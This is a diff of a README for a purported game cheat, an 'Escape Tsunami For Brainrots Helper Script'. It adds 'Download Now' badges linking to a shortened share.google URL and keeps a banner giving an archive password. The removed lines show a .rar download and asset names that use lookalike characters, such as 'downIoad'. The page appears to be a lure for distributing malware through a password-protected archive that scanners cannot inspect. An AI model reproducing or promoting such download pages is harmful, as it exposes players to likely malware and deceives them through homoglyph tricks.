@@ -1,6 +1,6 @@
-# 🌊 Escape Tsunami For Brainrots — Helper Script (Beta)
+# 🌊 Escape Tsunami For Brainrots — Helper Script 
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://share.google/8Ujwwl735ztNcfA7q logo)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Gold?logo=download&style=for-the-badge&labelColor=black)](https://share.google/8Ujwwl735ztNcfA7q)
 
 <img width="1536" height="1024" alt="0ebb2fa3-f624-489a-bc96-82b995420386" src="https://github.com/user-attachments/assets/e8f25980-da49-4fb2-8340-a8fb4373cbed" />
 
@@ -43,19 +43,7 @@ This project is licensed under the **MIT License**.
 
 As long as you keep the license and copyright notice.
 
----
 
-## 📺 YouTube Channel
-
-🎥 Follow development, updates, and future  here:
-
-👉 **YouTube:**
-
-<p align="center">
-  <a href="https://www.youtube.com/@SILENS_MODE">
-    <img src="https://github.com/light-00-veh/escape-tsunami-godmode/blob/main/assets/subscrib%D0%B5.png" alt="SUBSCRIBE" width="420">
-  </a>
-</p>
 ---
 
 ## 🤝 Contributions
@@ -68,15 +56,6 @@ Contributions, improvements, and ideas are welcome.
 
 ---
 
-## 🌍 Multilingual Note.
-
-
-
-<p align="center">
-  <a href="https://github.com/light-00-veh/escape-tsunami-godmode///escape-tsunami/escape-tsunami-v.1.3.20.rar">
-    <img src="https://github.com/light-00-veh/escape-tsunami-godmode/blob/main/assets/downIoad.png" alt="" width="420">
-  </a>
-</p>
 
 <h1 align="center" style="color:red; letter-spacing:3px;">
 ☠ ARCHIVE PASSWORD ☠<br>
@@ -85,7 +64,7 @@ silence1To
 
 
 ---
-
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Gold?logo=download&style=for-the-badge&labelColor=black)](https://share.google/8Ujwwl735ztNcfA7q)
 ## ⭐ Support
 
 If you find this project useful:
